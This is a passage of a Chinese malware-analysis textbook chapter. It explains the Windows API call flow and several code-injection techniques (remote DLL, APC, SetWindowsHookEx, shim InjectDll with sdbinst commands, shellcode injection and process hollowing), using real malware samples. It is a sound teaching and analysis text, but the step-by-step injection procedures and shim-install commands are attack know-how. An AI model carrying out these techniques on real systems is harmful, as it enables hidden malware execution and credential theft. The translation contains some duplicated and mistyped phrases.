Windows操作系统通过暴露在DLLs中实现的API来提供服务。一个应用程序通过调用DLL中实现的API来使用服务。大多数API函数最终会调用ntoskrnl.exe（内核执行）中的系统服务程序。在这一节中，我们将研究当应用程序调用API时会发生什么，以及API如何最终调用ntoskrnl.exe（执行）中的系统服务例程。具体来说，我们将看看当一个应用程序调用WriteFile()API时会发生什么。下图给出了API调用流程的高级概述。\n当一个进程通过双击程序被调用时，进程的可执行图像及其所有相关的DLLs被Windows加载器加载到进程内存中。当一个进程启动时，主线程被创建，它从内存中读取可执行代码并开始执行它。需要记住的一点是，执行代码的不是进程，而是执行代码的线程（进程只是线程的一个容器）。被创建的线程开始在用户模式下执行（有限制的访问）。一个进程可以根据需要明确地创建额外的线程。 我们假设一个应用程序需要调用WriteFile()API，它是由kernel32.dll导出的。为了将执行控制转移到WriteFile()，线程必须知道WriteFile()在内存中的地址。如果应用程序导入了WriteFile()，那么它可以通过查看一个叫做导入地址表（IAT）的函数指针表来确定其地址，如前图所示。这个表位于内存中的应用程序的可执行映像中，当DLLs被加载时，它被windows加载器填充了函数地址。 一个应用程序也可以在运行期间通过调用LoadLibrary()API来加载DLL。 它可以通过使用GetProcessAddress()API来确定加载的DLL中的函数地址。如果一个应用程序在运行期间加载一个DLL，那么IAT就不会被填充。 一旦线程从IAT或在运行时确定了WriteFile()的地址，它就会调用WriteFile()，在kernel32.dll中实现。WriteFile()函数中的代码最终会调用一个DLL网关，ntdll.dll导出的函数NtWriteFile()。ntdll.dll 中的 NtWriteFile() 函数并不是 NtWriteFile() 的真正实现。实际的函数，具有相同的名称，NtWriteFile()（系统服务例程），驻留在ntoskrnl.exe（执行）中，它包含真正的实现。ntdll.dll中的NtWriteFile()只是一个存根例程，执行SYSENTER（x86）或SYSCALL（x64）指令。这些指令将代码过渡到内核模式。 现在，在内核模式下运行的线程（具有不受限制的访问权限）需要找到实际函数NtWriteFile()的地址，该函数在ntoskrnl.exe中实现。要做到这一点，它需要查询内核空间中的一个表称为系统服务描述符表（SSDT），并确定NtWriteFile()的地址。然后，它调用Windows执行程序（在ntoskrnl.exe中）中实际的NtWriteFile()（系统服务例程），该程序将请求引向I/O管理器中的I/O功能。然后，I/O管理器将请求指向适当的内核模式设备驱动程序。内核模式设备驱动程序使用HAL导出的例程来与硬件接口。 3. 代码注入技术 如前所述，代码注入技术的目的是将代码注入远程进程的内存，并在远程进程的上下文中执行注入的代码。注入的代码可以是一个模块，如可执行文件，DLL，甚至是shellcode。代码注入技术为攻击者提供了许多好处；一旦代码被注入到远程进程中，攻击者可以做以下事情。\n迫使远程进程执行注入的代码以进行恶意操作（如下载额外的文件或窃取键盘按键信息）。 注入一个恶意模块（如DLL），并将远程进程的API调用重定向到注入模块中的一个恶意函数。然后，该恶意函数可以拦截API调用的输入参数，也可以过滤输出参数。例如，Internet Explorer使用HttpSendRequest()向Web服务器发送一个包含可选POST有效载荷的请求，它使用InternetReadFile()从服务器的响应中获取字节，并在浏览器中显示它。攻击者可以在Internet Explorer的进程内存中注入一个模块，并将HttpSendRequest()重定向到被注入模块中的恶意函数，以便从POST有效载荷中提取证书。以同样的方式，它可以拦截从InternetReadFile()API收到的数据，读取数据或修改从网络服务器收到的数据。这使攻击者能够在数据到达网络服务器之前拦截数据（如银行凭证），也使攻击者能够在数据到达受害者的浏览器之前替换或插入额外的数据到服务器的响应中（如在HTML内容中插入一个额外的字段）。 将代码注入到已经运行的进程中，允许攻击者实现持久性。 将代码注入到受信任的进程中，允许攻击者绕过安全产品（如白名单软件）并躲避用户。 在本节中，我们将主要关注用户空间中的代码注入技术。我们将研究攻击者用来对远程进程进行代码注入的各种方法。\n在以下代码注入技术中，有一个注入代码的恶意软件进程（启动器或加载器）和一个合法进程（如explorer.exe），代码将被注入其中。在执行代码注入之前，启动器需要首先确定要注入代码的进程。这通常是通过列举系统上运行的进程来完成的；它使用三个API调用。CreateToolhelp32Snapshot(), Process32First(), 和Process32Next()。CreateToolhelp32Snapshot()用于获取所有正在运行的进程的快照；Process32First()获取快照中第一个进程的信息；Process32Next()在一个循环中用于遍历所有进程。Process32First()和Process32Next()API获得有关进程的信息，如可执行名称、进程ID和父进程ID；这些信息可以被恶意软件用来确定它是否是目标进程。有时，恶意程序不是将代码注入已经运行的进程，而是启动一个新的进程（如notepad.exe），然后向其中注入代码。\n无论恶意软件是向已经运行的进程注入代码，还是启动一个新的进程来注入代码，所有代码注入技术（接下来会介绍）的目标都是向目标（合法）进程的地址空间注入恶意代码（无论是DLL、可执行代码，还是Shellcode），并迫使合法进程执行注入的代码。根据代码注入技术的不同，要注入的恶意组件可以驻留在磁盘或内存中。下图应该能让你对用户空间的代码注入技术有一个高层次的了解。\n3.1 远程DLL注入 在这种技术中，目标（远程）进程被强迫通过LoadLibrary()API将一个恶意的DLL加载到其进程内存空间。kernel32.dll输出LoadLibrary()，该函数接受一个参数，即磁盘上DLL的路径，并将该DLL加载到调用进程的地址空间。在这种注入技术中，恶意软件进程在目标进程中创建了一个线程，该线程通过传递恶意DLL路径作为参数来调用LoadLibrary()。由于线程在目标进程中被创建，目标进程将恶意DLL加载到其地址空间。一旦目标进程加载了恶意DLL，操作系统就会自动调用DLL的DllMain()函数，从而执行恶意代码。\n下面的步骤详细描述了这种技术是如何进行的，以一个名为nps.exe（加载器或启动器）的恶意软件为例，它通过LoadLibrary()向合法的explorer.exe进程注入一个DLL。在注入恶意的DLL组件之前，它被投放到磁盘上，然后执行以下步骤。\n恶意软件进程（nps.exe）识别目标进程（explorer.exe，在这种情况下）并获得其进程ID（pid）。获取pid的目的是为目标进程打开一个句柄，以便恶意软件进程能够与之互动。要打开一个句柄，需要使用OpenProcess()API，它接受的参数之一是进程的pid。在下面的截图中，恶意软件通过传递explorer.exe的pid（0x624，即1572）作为第三个参数调用OpenProcess()。OpenProcess()的返回值是对explorer.exe进程的句柄。 然后，恶意软件进程在目标进程中使用VirutualAllocEx()API分配内存。在下面的截图中，第1个参数（0x30）是explorer.exe（目标进程）的句柄，它从上一步获得。第3个参数，0x27（39），代表目标进程中要分配的字节数，第5个参数（0x4）是一个常量值，代表PAGE_READWRITE的内存保护。VirtualAllocEx()的返回值是explorer.exe中分配的内存地址。 在目标进程中分配内存的原因是为了复制一个字符串，以确定磁盘上恶意DLL的完整路径。恶意软件使用WriteProcessMemory()将DLL路径名复制到目标进程的分配内存中。在下面的截图中，第2个参数0x01E30000是目标进程中分配的内存地址，第3个参数是DLL的完整路径，将被写入explorer.exe中分配的内存地址0x01E30000。 将DLL路径名复制到目标进程内存的想法是，以后在目标进程中创建远程线程以及通过远程线程调用LoadLibrary()时，DLL路径将作为参数传递给LoadLibrary()。在创建远程线程之前，恶意软件必须确定LoadLibrary()在kernel32.dll中的地址；为此，它调用GetModuleHandleA()API并传递kernel32.dll作为参数，这将返回Kernel32.dll的基地址。一旦得到kernel32.dll的基地址，它就通过调用GetProcessAddress()来确定LoadLibrary()的地址。 在这一点上，恶意软件已经复制了目标进程内存中的DLL路径名，并确定了LoadLibrary()的地址。现在，恶意软件需要在目标进程（explorer.exe）中创建一个线程，这个线程必须通过传递复制的DLL路径名来执行LoadLibrary()，这样恶意的DLL就会被explorer.exe加载。要做到这一点，恶意软件调用CreateRemoteThread()（或未记录的API NtCreateThreadEx()），这在目标进程中创建一个线程。在下面的截图中，CreateRemoteThread()的第一个参数0x30是explorer.exe进程的句柄，该线程将在其中创建。第4个参数是目标进程内存中线程将开始执行的地址，也就是LoadLibrary()的地址，第5个参数是目标进程内存中包含DLL完整路径的地址。在调用CreateRemoteThread()后，explorer.exe中创建的线程调用LoadLibrary()，它将从磁盘上加载DLL到explorer.exe进程内存空间。作为加载恶意DLL的结果，其DLLMain()函数被自动调用，从而在explorer.exe的上下文中执行恶意代码。 一旦注入完成，恶意软件调用VirtualFree()API释放包含DLL路径的内存，并通过使用CloseHandle()API关闭目标进程（explorer.exe）的句柄。 一个恶意进程可以将代码注入到以相同或更低的完整性级别运行的其他进程。例如，一个以中等完整性运行的恶意软件进程可以将代码注入explorer.exe进程（它也以中等完整性级别运行）。为了操纵系统级进程，恶意进程需要通过调用AdjustTokenPrivileges()来启用SE_DEBUG_PRIVILEGE（这需要管理员权限）；这允许它读取、写入或注入代码到另一个进程的内存。\n3.2 使用APC的DLL注入（APC注入） 在之前的技术中，在写入DLL路径名后，CreateRemoteThread()被调用，以在目标进程中创建一个线程，而这个线程又调用LoadLibrary()来加载恶意的DLL。APC注入技术类似于远程DLL注入，但恶意软件不是使用CreateRemoteThread()，而是利用异步过程调用（APC）来强迫目标进程的线程加载恶意DLL。\nAPC是一个在特定线程的上下文中异步执行的函数。每个线程都包含一个APC队列，当目标线程进入可警告状态时，APC将被执行。根据微软的文档（https://msdn.microsoft.com/en-us/library/windows/desktop/ms681951(v=vs.85).aspx），如果一个线程调用了以下函数之一，它就进入了可预警状态。\nSleepEx(), SignalObjectAndWait() MsgWaitForMultipleObjectsEx() WaitForMultipleObjectsEx() WaitForSingleObjectEx()APC注入技术的工作方式是，恶意软件进程确定目标进程（将注入代码的进程）中的线程，该线程处于可警告状态，或可能进入可警告状态。然后，它通过使用QueueUserAPC()函数将自定义代码放入该线程的APC队列。排列自定义代码的想法是，当线程进入可警告状态时，自定义代码会从APC队列中被选中，并由目标进程的线程执行。\n它使用OpenThread()API为目标进程的线程打开一个句柄。在下面的截图中，第3个参数，0xBEC(3052)，是iexplore.exe进程的线程ID（TID）。OpenThread()的返回值是iexplore.exe的线程句柄。 然后，恶意软件进程调用QueueUserAPC()，在Internet Explorer线程的APC队列中编排指定的APC函数。在下面的截图中，QueueUserAPC()的第一个参数是指向恶意软件希望目标线程执行的APC函数的指针。在这种情况下，APC函数是LoadLibrary()，其地址先前已经确定。第二个参数，0x22c，是iexplore.exe目标线程的句柄。第3个参数，0x2270000，是目标进程（iexplore.exe）内存中的地址，包含恶意DLL的完整路径；当线程执行时，这个参数将自动作为参数传递给APC函数（LoadLibrary()）。 下面的截图显示了Internet Explorer进程内存中的地址0x2270000的内容（这是作为第3个参数传递给QueueUserAPC()的；这个地址包含了之前被恶意软件写入的DLL的完整路径。\n此时，注入已经完成，当目标进程的线程进入可预警状态时，该线程从APC队列中执行LoadLibrary()，DLL的完整路径被作为参数传递给LoadLibrary()。结果，恶意的DLL被加载到目标进程的地址空间，而目标进程又调用了包含恶意代码的DLLMain()函数。\n3.3 使用SetWindowsHookEx()进行DLL注入 在上一章中（参考第1.3.2节，使用SetWindowsHookEx的键盘记录器），我们研究了恶意软件如何使用SetWindowsHookEx() API来安装一个钩子程序来监控键盘事件。SetWindowsHookEx()API也可用于将DLL加载到目标进程地址空间并执行恶意代码。要做到这一点，恶意软件首先将恶意DLL加载到自己的地址空间。然后，它为一个特定的事件（如键盘或鼠标事件）安装一个钩子程序（由恶意DLL导出的函数），并将该事件与目标进程的线程（或当前桌面中的所有线程）联系起来。这个思路是，当一个特定的事件被触发时，为其安装的钩子，目标进程的线程将调用该钩子程序。为了调用DLL中定义的钩子程序，它必须将DLL（包含钩子程序）加载到目标进程的地址空间。\n换句话说，攻击者创建了一个包含导出函数的DLL。包含恶意代码的导出函数被设置为特定事件的钩子程序。该钩子程序与目标进程的一个线程相关联，当事件被触发时，攻击者的DLL被加载到目标进程的地址空间，钩子程序被目标进程的线程调用，从而执行恶意代码。恶意软件可以为任何类型的事件设置钩子，只要该事件有可能发生。这里的重点是，DLL被加载到目标进程的地址空间，并执行恶意的行为。\n下面描述了恶意软件样本（Trojan Padador）执行的步骤，将其DLL加载到远程进程的地址空间，并执行恶意代码。\n恶意软件的可执行程序在磁盘上投放了一个名为tckdll.dll的DLL。该DLL包含一个导入函数，和一个名为TRAINER的导出函数，如下所示。DLL的导入函数并没有做什么，而TRAINER函数包含恶意代码。这意味着，DLL只被加载时（其导入函数被调用），不会执行恶意代码；只有当TRAINER函数被调用时，才会执行恶意行为。 恶意软件使用LoadLibrary()API将DLL（tckdll.dll）加载到自己的地址空间。使用LoadLibrary()API将DLL（tckdll.dll）加载到自己的地址空间，但在这一点上没有恶意代码被执行。LoadLibrary()的返回值是加载模块（tckdll.dll）的句柄。模块（tckdll.dll）的句柄。然后它通过使用GetProcAddress()确定TRAINER函数的地址。 恶意软件使用tckdll.dll的句柄和TRAINER函数的地址为键盘事件注册一个钩子程序。TRAINER函数的地址来为键盘事件注册一个钩子过程。在下面的截图中，第1个参数WH_KEYBOARD（常量值2）指定了将调用钩子程序的事件类型。第2个参数是钩子程序的地址，也就是上一步确定的TRAINER函数的地址。第3个参数是指向tckdll.dll的句柄，它包含钩子程序。第四个参数，0，指定钩子程序必须与当前桌面上的所有线程相关联。恶意软件可以不把钩子程序与所有的桌面线程联系起来，而是通过提供线程ID来锁定一个特定的线程。 在执行了前面的步骤后，当键盘事件在一个应用程序中被触发时，该应用程序将加载恶意的DLL并调用TRAINER函数。例如，当你启动记事本并输入一些字符（触发了键盘事件）时，tckdll.dll将被加载到记事本的地址空间，TRAINER函数将被调用，迫使notepad.exe进程执行恶意代码。\n3.4 使用应用程序兼容性的DLL注入 微软Windows应用程序兼容性基础设施/框架（应用垫片shim）是一项功能，允许为旧版本的操作系统（如Windows XP）创建的程序在现代版本的操作系统（如Windows 7或Windows 10）上运行。如Windows XP创建的程序能够在现代版本的操作系统（如Windows 7或Windows 10）上运行。这是通过应用程序兼容性修复（垫片shim）实现的。\n垫片是由微软提供给开发者的，这样他们就可以在不重写代码的情况下对其程序进行修复。当垫片被应用于一个程序，并且当垫片后的程序被执行时，垫片引擎将垫片后的程序所做的API调用重定向到垫片代码；这是通过将IAT中的指针替换为垫片代码的地址来实现的。关于应用程序如何使用IAT的细节已在第2.1节Windows API调用流程中涉及。换句话说，它钩住了Windows API，将调用重定向到shim代码，而不是在DLL中直接调用API。作为API重定向的结果，shim代码可以修改传递给API的参数，重定向API，或者修改Windows操作系统的响应。下图应该可以帮助你理解Windows操作系统中正常应用程序和shimed应用程序之间的交互差异。\n为了帮助你理解垫片的功能，让我们看一个例子。假设几年前（在Windows 7发布之前），你写了一个应用程序（xyz.exe），在执行一些有用的操作之前检查操作系统版本。假设你的应用程序通过调用kernel32.dll中的GetVersion()API来确定操作系统的版本的API来确定操作系统的版本。简而言之，只有当操作系统的版本是Windows XP时，该应用程序才会做一些有用的事情。现在，如果你把那个应用程序（xyz.exe）放在Windows 7上运行，它将不会做任何有用的事情，因为Windows 7上通过GetVersion()返回的操作系统版本因为GetVersion()返回的操作系统版本与Windows XP不一致。要使该程序在Windows 7上运行，你可以修复代码并重建程序，或者你可以在该程序（xyz.exe）上应用一个名为WinXPVersionLie的垫片。\n在应用垫片后，当垫片应用程序（xyz.exe）在Windows 7上执行时，当它试图通过调用GetVersion()来确定操作系统版本时，垫片引擎拦截并返回一个不同的Windows版本（Windows XP而不是而不是Windows 7）。更具体的说，当被垫片的应用程序被执行时，垫片引擎修改了IAT并将GetVersion()API调用重定向到店牌呢代码（而不是kernel32.dll）。换句话说，WinXPVersionLie 垫片是在欺骗应用程序，使其相信自己是在Windows XP上运行，而没有修改应用程序中的代码。\n关于垫片引擎工作的详细信息，请参阅Alex Ionescu的博文《应用程序兼容性数据库的秘密》 (SDB)，http://www.alex-ionescu.com/?p=39。\n微软提供了数以百计的垫片（如WinXPVersionLie），可以应用于一个应用程序以改变其行为。其中一些垫片被攻击者滥用，以实现持久性，注入代码，并以较高的权限执行恶意代码。\n3.4.1 创建一个shim垫片 有许多垫片可以被攻击者滥用于恶意的目的。在本节中，我将引导你完成创建一个用于将DLL注入目标进程的垫片的过程；这将帮助你了解攻击者创建一个垫片并滥用这一功能是多么容易。在这个案例中，我们将为 notepad.exe 创建一个 shim（主要是 shimeng.dll 和 apphelp.dll — 这是应用程序兼容性接口），并使其加载一个我们选择的 DLL。为一个应用程序创建一个垫片可以分为四个步骤。\n选择要进行垫片的应用程序。 为该应用程序创建垫片数据库。 保存数据库（.sdb文件）。 安装数据库。要创建和安装一个垫片，你需要有管理员权限。你可以通过使用微软提供的一个工具来执行前面所有的步骤，这个工具叫做Application Compatibility Toolkit（ACT）。对于Windows 7，它可以从https://www.microsoft.com/en-us/download/details.aspx?id=7352(已经不再支持下载了) 下载，对于Windows 10，它与Windows ADK捆绑在一起；根据版本不同，它可以从https://developer.microsoft.com/en-us/windows/hardware/windows-assessment-deployment-kit（https://docs.microsoft.com/zh-cn/windows-hardware/get-started/adk-install）下载。在64位版本的Windows上，ACT将安装两个版本的兼容性管理员工具（32位和64位）。要对32位程序进行调整，你必须使用32位版本的兼容性管理员工具，要对64位程序进行调整，请使用64位版本。 要想了解关于调整引擎工作的详细信息，请参考Alex Ionescu的博文《应用程序兼容性数据库的秘密》(SDB)，网址是http://www.alex-ionescu.com/?p=39。 为了演示这个概念，我将使用32位版本的Windows 7，选择的目标进程是notepad.exe。我们将创建一个InjectDll垫片来使notepad.exe加载一个名为abcd.dll的DLL。要创建一个垫片，从开始菜单中启动兼容性管理员工具（32位），然后右键点击新数据库|应用程序修复。\n在下面的对话框中，输入你要调整的应用程序的细节。程序的名称和供应商名称可以是任何东西，但程序文件的位置应该是正确的。 在你按下 “下一步 “按钮后，你将看到一个 “兼容模式 “对话框；你可以直接按 “下一步 “按钮。在下一个窗口中，你将会看到兼容性修复（Shims）对话框；在这里你可以选择各种Shims。在这种情况下，我们对InjectDll 垫片感兴趣。选择InjectDll垫片复选框，然后点击参数按钮，输入DLL的路径（这是我们希望记事本加载的DLL），如下所示。点击 “确定 “并按下 “下一步 “按钮。需要注意的一点是，InjectDll垫片选项只在32位兼容管理员工具中可用，这意味着你只能将这个shim应用到32位进程中。\n接下来，你将看到一个屏幕，指定哪些属性将被程序（notepad）匹配。当notepad.exe运行时，所选的属性将被匹配，在匹配条件得到满足后，将应用垫片。为了使匹配条件不那么严格，我取消了所有的选项，在这里显示。\n在你点击 “完成 “后，一个完整的应用程序和应用的修复的摘要将呈现在你面前，如下所示。在这一点上，包含notepad.exe的shim信息的shim数据库被创建。\n下一步是保存数据库；要做到这一点，点击 “保存 “按钮，在出现提示时，给你的数据库起个名字并保存文件。在这种情况下，数据库文件被保存为notepad.sdb（你可以自由选择任何文件名）。\n数据库文件被保存后，下一步是安装数据库。你可以通过右击保存的垫片，点击安装按钮进行安装，如图所示。 另一种安装数据库的方法是使用一个内置的命令行工具，sdbinst.exe；可以通过使用以下命令安装数据库。\nsdbinst.exe notepad.sdb 现在，如果你调用notepad.exe，abcd.dll将从c:\\test目录加载到notepad的进程地址空间，如图所示。\n3.4.2 shim工件 在这一点上，你已经了解了如何使用shim将DLL加载到目标进程的地址空间。在我们研究攻击者如何使用 shim 之前，必须了解当你安装 shim 数据库（通过右键点击数据库并选择安装或使用sdbinst.exe工具）。当你安装数据库时，安装程序为数据库创建一个GUID，并将.sdb文件复制到%SystemRoot%\\AppPatch\\Custom\u003cGUID\u003e.sdb（对于32位垫片）或%SystemRoot%\\AppPatch\\Custom\\Custom64\u003cGUID\u003e.sdb（用于64位垫片）。它还在以下注册表键中创建两个注册表项。\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\\ HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\\下面的截图显示了创建的注册表项HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\AppCompatFlags\\Custom\\这个注册表项包含应用垫片的程序名称，以及相关的垫片数据库文件（.sdb）。\n第二个注册表，HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\\，包含数据库信息和shim数据库文件的安装路径。\n创建这些组件的目的是为了在执行应用程序时，加载器通过查询这些注册表项来确定应用程序是否需要垫片，并调用垫片引擎，该引擎将使用位于AppPatch/目录中的.sdb文件的配置来垫片应用程序。由于安装shim数据库而产生的另一个组件是，在控制面板的已安装程序列表中添加了一个条目。\n3.4.3 攻击者如何使用垫片 下面的步骤描述了攻击者可能以何种方式将一个应用程序进行垫片并安装在受害者系统上。\n攻击者为目标应用程序（如notepad.exe，或受害者经常使用的任何合法第三方应用程序）创建一个应用程序兼容性数据库（shim数据库）。攻击者可以选择一个垫片，如InjectDll，或多个垫片。 攻击者保存为目标应用程序创建的shim数据库（.sdb文件）。 .sdb文件被传递并丢在受害者系统上（主要是通过恶意软件），它被安装，通常使用sdbinst工具。 攻击者调用目标应用程序或等待用户执行目标应用程序。 攻击者也可能删除安装shim数据库的恶意软件。在这种情况下，你就只剩下.sdb文件了。 攻击者只需将.sdb文件放到文件系统的某个位置，并修改最小的注册表项集，就可以安装一个shim数据库。这种技术避免了使用sdbinst工具。shim_persist（https://github.com/hasherezade/persistence_demos/tree/master/shim_persist）是一个POC，由安全研究员Hasherezade（https://github.com/hasherezade/persistence_demos/）编写。 研究员Hasherezade (@hasherezade)编写的POC，它使用一个DLL安装垫片，而不使用sdbinst工具将所丢的DLL注入explorer.exe进程。\n恶意软件作者出于不同的目的滥用了垫片，如实现持久性、代码注入、禁用安全功能、以高权限执行代码和绕过用户账户控制（UAC）提示。下表概述了一些有趣的垫片和它们的描述。\nShim名称 描述 RedirectEXE 重定向执行 InjectDll 将DLL注入到应用程序中 DisableNXShowUI 禁用数据执行预防（DEP） CorrectFilePaths 重定向文件系统路径 VirtualRegistry 注册表重定向 RelaunchElevated 以较高的权限启动应用程序 TerminateExe 在启动时终止可执行程序 DisableWindowsDefender 禁用应用程序的Windows Defender服务 RunAsAdmin 标记一个应用程序以管理员权限运行 关于在攻击中如何使用垫片的更多信息，请参阅安全研究人员在各种会议上发表的谈话，所有这些都可以在https://sdb.tools/talks.html。\n3.4.4 分析Shim数据库 为了对一个应用程序进行垫片，攻击者会安装垫片数据库（.sdb），该数据库驻留在受害者的文件系统的某个地方。假设你已经确定了恶意活动中使用的.sdb文件，你可以通过使用诸如sdb-explorer（https://github.com/evil-e/sdb-explorer）或python-sdb（https://github.com/williballenthin/python-sdb）的工具来调查.sdb文件。\n在下面的例子中，python-sdb工具被用来调查我们先前创建的shim数据库（.sdb）文件。在shim数据库上运行python-sdb显示其元素，如图所示。\n$ python sdb_dump_database.py notepad.sdb \u003cDATABASE\u003e \u003cTIME type='integer'\u003e0x1d3928964805b25\u003c/TIME\u003e \u003cCOMPILER_VERSION type='stringref'\u003e2.1.0.3\u003c/COMPILER_VERSION\u003e \u003cNAME type='stringref'\u003enotepad\u003c/NAME\u003e \u003cOS_PLATFORM type='integer'\u003e0x1\u003c/OS_PLATFORM\u003e \u003cDATABASE_ID type='guid'\u003eed41a297-9606-4f22-93f5- b37a9817a735\u003c/DATABASE_ID\u003e \u003cLIBRARY\u003e \u003c/LIBRARY\u003e \u003cEXE\u003e \u003cNAME type='stringref'\u003enotepad.exe\u003c/NAME\u003e \u003cAPP_NAME type='stringref'\u003enotepad\u003c/APP_NAME\u003e \u003cVENDOR type='stringref'\u003e\u0026lt;Unknown\u0026gt;\u003c/VENDOR\u003e \u003cEXE_ID type='hex'\u003ea65e89a9-1862-4886-b882-cb9b888b943c\u003c/EXE_ID\u003e \u003cMATCHING_FILE\u003e \u003cNAME type='stringref'\u003e*\u003c/NAME\u003e \u003c/MATCHING_FILE\u003e \u003cSHIM_REF\u003e \u003cNAME type='stringref'\u003eInjectDll\u003c/NAME\u003e \u003cCOMMAND_LINE type='stringref'\u003ec:\\test\\abcd.dll\u003c/COMMAND_LINE\u003e \u003c/SHIM_REF\u003e \u003c/EXE\u003e \u003c/DATABASE\u003e 在其中一次攻击中，RedirectEXE shim被dridex恶意软件用来绕过UAC。它安装了shim数据库，并在提升权限后立即将其删除。欲了解更多细节，请参考博文： https://blogs.jpcert.or.jp/en/2015/02/a-new-uac-bypass-method-that-dridex-uses.html\nsdbinst.exe /q /u \"C:\\Users\\user_name\\AppData\\LocalLow\\$$$.sdb\"3.5 远程可执行程序/外壳代码注入 在这种技术中，恶意代码被直接注入到目标进程的内存中，而不在磁盘上丢弃组件。恶意代码可以是一个shellcode或一个可执行文件，其导入地址表是为目标进程配置的。注入的恶意代码通过CreateRemoteThread()创建一个远程线程来强制执行，并使该线程的起点指向注入的代码块中的代码/函数。这种方法的优点是，恶意软件进程不必在磁盘上投放恶意DLL；它可以从二进制文件的资源部分提取要注入的代码，或者通过网络获取，直接进行代码注入。\n下面的步骤描述了这种技术的执行方式，以一个名为nsasr.exe（W32/Fujack）的恶意软件样本为例，它将可执行文件注入Internet Explorer（iexplorer.exe）进程。\n恶意软件进程（nsasr.exe）使用OpenProcess()API打开Internet Explorer进程（iexplore.exe）的一个句柄。\n它在目标进程（iexplore.exe）中分配内存的一个特定地址，0x13150000。地址，0x13150000，使用带有PAGE_EXECUTE_READWRITE保护的VirutualAllocEx()，而不是PAGE_READWRITE（与在第3.1节涉及的远程DLL注入技术相比）。PAGE_EXECUTE_READWRITE保护允许恶意软件进程（nsasr.exe）将代码写入目标进程，在写入代码后，这种保护允许目标进程（iexplore.exe）从该内存读取和执行代码。\n然后，它使用WriteProcessMemory()将恶意的可执行内容写入上一步分配的内存中。在下面的截图中，第一个参数，0xD4，是iexplore.exe的句柄。第二个参数，0x13150000，是目标进程（iexplore.exe）中的地址。内存中的地址，内容将被写入其中。第3个参数，0x13150000，是恶意软件（nsasr.exe）进程内存中的缓冲区；这个缓冲区包含可执行内容，它将被写入目标进程内存。\n恶意可执行内容被写入（地址为0x13150000）iexplore.exe进程内存后，它调用CreateRemoteThread()API来创建一个远程线程，并使线程的起始地址指向注入的可执行文件的入口地址。在下面的截图中，第4个参数，0x13152500，指定了目标进程（iexplore.exe）内存中线程开始执行的地址；这是注入的可执行文件的入口地址。在这一点上，注入已经完成，iexplore.exe进程中的线程开始执行恶意代码。 反射性DLL注入是一种类似于远程可执行文件/ShellCode注入的技术。在这种方法中，包含反射式加载器组件的DLL被直接注入，而目标进程则要调用反射式加载器组件，该组件负责解决导入问题，将其重新定位到一个合适的内存位置，并调用DllMain()函数。这种技术的优点是，它不依赖于LoadLibrary()函数来加载DLL。由于LoadLibrary()只能从磁盘上加载库，注入的DLL不需要驻留在磁盘上。关于这项技术的更多信息，请参考Stephen Fewer的Reflective DLL Injection，网址是：https://github.com/stephenfewer/ReflectiveDLLInjection。\n3.6 hollow空洞化进程注入（进程空洞化） 进程空洞化，或空洞进程注入，是一种代码注入技术，其中合法进程在内存中的可执行部分，被替换为恶意的可执行文件。这种技术允许攻击者将其恶意软件伪装成合法进程并执行恶意代码。这种技术的好处是，被掏空的进程的路径仍然会指向合法的路径，而且，通过在合法进程的上下文中执行，恶意软件可以绕过防火墙和主机入侵防御系统。例如，如果svchost.exe进程被掏空，其路径仍将指向合法的可执行路径（C:\\Windows\\system32\\svchost.exe），但是，只有在内存中，svchost.exe的可执行部分被替换为恶意代码；这使得攻击者可以不被现场取证工具检测到。\n下面的步骤描述了恶意软件样本（Skeeyah）执行的空心程序注入。在下面的描述中，恶意软件进程在执行这些步骤之前，从其资源部分提取要注入的恶意可执行文件。\n恶意软件进程在暂停模式下启动一个合法进程。因此，合法进程的可执行部分被加载到内存中，内存中的进程环境块（PEB）结构确定了合法进程的完整路径。PEB的ImageBaseAddress(Peb.ImageBaseAddress)字段包含合法进程可执行文件被加载的地址。在下面的截图中，恶意软件以暂停模式启动合法的svchost.exe进程，在这种情况下，svchost.exe被加载到地址0x01000000。 恶意软件确定了PEB结构的地址，这样它就可以读取PEB.ImageBaseAddress字段来确定进程可执行文件（svchost.exe）的基本地址。为了确定PEB结构的地址，它调用GetThreadContext()。GetThreadContext()检索指定线程的上下文，它需要两个参数：第1个参数是线程的句柄，第2个参数是一个指向结构的指针，名为CONTEXT。在这种情况下，恶意软件将悬浮线程的句柄作为GetThreadContext()的第1个参数，并将指向CONTEXT结构的指针作为第2个参数。在这个API调用后，CONTEXT结构被填充了暂停线程的上下文。该结构包含暂停线程的寄存器状态。然后，恶意软件读取CONTEXT._Ebx字段，它包含指向PEB数据结构的指针。一旦确定了PEB的地址，它就会读取PEB.ImageBaseAddress，以确定进程可执行文件的基础地址（换句话说，0x01000000）。 另一种确定指向PEB的指针的方法是使用NtQueryInformationProcess()函数；详情可在https://msdn.microsoft.com/en-us/library/windows/desktop/ms684280(v=vs.85).aspx（https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess?redirectedfrom=MSDN）。 3. 一旦确定了目标进程可执行文件在内存中的地址，它就会使用NtUnMapViewofSection()API来取消合法进程（svchost.exe）的可执行部分的分配。在下面的截图中，第一个参数是svchost.exe进程的句柄（0x34），第二个参数是要取消分配的进程可执行文件的基本地址（0x01000000）。\n进程可执行部分被掏空后，它在合法进程（svchost.exe）中分配了一个新的内存段，具有读、写和执行权限。新的内存段可以分配在同一地址（空洞化之前进程可执行部分所在的位置）或不同的区域。在下面的截图中，恶意软件使用VirutalAllocEX()来分配不同区域的内存（在这种情况下，在0x00400000）。 然后，它使用WriteProcessMemory()将恶意的可执行文件及其部分复制到新分配的内存地址0x00400000。 然后，恶意软件用新分配的地址覆盖了合法进程的PEB.ImageBaseAdress。下面的截图显示了恶意软件用新的地址（0x00400000）覆盖了svchost.exe的PEB.ImageBaseAdress；这改变了svchost.exe在PEB中的基础地址，从0x1000000到0x00400000（这个地址现在包含注入的可执行文件）。 然后，恶意软件改变了暂停线程的起始地址，使其指向注入的可执行文件的入口点地址。这是通过设置CONTEXT._Eax值并调用SetThreadContext()。在这一点上，暂停进程的线程指向被注入的代码。然后，它使用ResumeThread()恢复被暂停的线程。在这之后，恢复的线程开始执行注入的代码。 